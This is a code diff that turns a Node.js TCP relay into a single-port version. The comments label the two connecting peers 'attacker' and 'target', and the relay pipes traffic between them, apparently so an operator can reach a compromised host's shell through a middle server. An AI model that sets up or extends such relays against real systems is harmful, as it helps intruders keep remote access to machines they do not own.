@@ -1,8 +1,7 @@
 const net = require("net");
 
 // Configuration
-const TUNNEL_PORT1 = 4545; // Port for the attacker to connect to
-const TUNNEL_PORT2 = 5555; // Port for the target to connect to
+const TUNNEL_PORT = process.env.PORT || 4545; // The single port to listen on
 
 let attackerClient = null;
 let targetClient = null;
@@ -29,34 +28,31 @@ function forwardData(src, dest) {
   });
 }
 
-// Create a server for TUNNEL_PORT1
-const server1 = net.createServer((socket) => {
-  console.log("Attacker connected");
-  attackerClient = socket;
+// Create a server
+const server = net.createServer((socket) => {
+  if (!attackerClient) {
+    console.log("Attacker connected");
+    attackerClient = socket;
 
-  if (targetClient) {
-    forwardData(attackerClient, targetClient);
-    forwardData(targetClient, attackerClient);
+    if (targetClient) {
+      forwardData(attackerClient, targetClient);
+      forwardData(targetClient, attackerClient);
+    }
+  } else if (!targetClient) {
+    console.log("Target connected");
+    targetClient = socket;
+
+    if (attackerClient) {
+      forwardData(attackerClient, targetClient);
+      forwardData(targetClient, attackerClient);
+    }
+  } else {
+    console.log("Both clients are already connected");
+    socket.end();
   }
 });
 
-// Create a server for TUNNEL_PORT2
-const server2 = net.createServer((socket) => {
-  console.log("Target connected");
-  targetClient = socket;
-
-  if (attackerClient) {
-    forwardData(attackerClient, targetClient);
-    forwardData(targetClient, attackerClient);
-  }
-});
-
-// Start listening on TUNNEL_PORT1
-server1.listen(TUNNEL_PORT1, () => {
-  console.log(`Listening on port ${TUNNEL_PORT1} for attacker`);
-});
-
-// Start listening on TUNNEL_PORT2
-server2.listen(TUNNEL_PORT2, () => {
-  console.log(`Listening on port ${TUNNEL_PORT2} for target`);
+// Start listening on the single port
+server.listen(TUNNEL_PORT, () => {
+  console.log(`Listening on port ${TUNNEL_PORT}`);
 });
